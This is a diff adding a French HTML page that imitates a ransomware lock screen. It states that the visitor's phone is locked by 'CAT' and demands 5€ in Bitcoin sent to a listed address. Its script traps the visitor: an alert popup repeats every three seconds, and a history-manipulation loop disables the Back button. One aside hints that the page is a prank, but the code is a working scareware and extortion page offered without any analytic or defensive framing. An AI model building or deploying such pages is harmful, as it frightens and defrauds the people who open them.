@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔴 TÉLÉPHONE VERROUILLÉ</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            background: #0a0a0a;
+            font-family: 'Courier New', monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #ff3355;
+            text-align: center;
+            padding: 20px;
+            animation: flash 0.5s infinite alternate;
+        }
+        @keyframes flash {
+            0% { background: #0a0a0a; }
+            100% { background: #1a0000; }
+        }
+        .container { max-width: 500px; }
+        h1 { font-size: 2.5em; letter-spacing: 5px; }
+        p { font-size: 1.2em; margin: 20px 0; color: #ff6666; }
+        .code { font-size: 1.5em; color: #00ff88; letter-spacing: 10px; }
+        .footer { margin-top: 30px; font-size: 0.8em; color: #555; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>🔴 VERROUILLÉ</h1>
+    <p>Votre téléphone a été sécurisé par <strong>CAT</strong>.</p>
+    <p>Pour déverrouiller, envoyez <span class="code">5€</span> en Bitcoin à :</p>
+    <p style="font-size:1.8em; color:#00ff88;">1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</p>
+    <p style="font-size:0.8em; color:#666;">(ou redémarrez 3 fois, ça marche aussi)</p>
+    <div class="footer">🐱 CAT vous surveille.</div>
+</div>
+<script>
+    // Piège : boucle infinie de popups
+    setInterval(() => {
+        alert('🔴 VOTRE TÉLÉPHONE EST VERROUILLÉ');
+    }, 3000);
+    // Empêche la sortie
+    history.pushState(null, null, window.location.href);
+    window.addEventListener('popstate', function() {
+        history.pushState(null, null, window.location.href);
+    });
+</script>
+</body>
+</html>
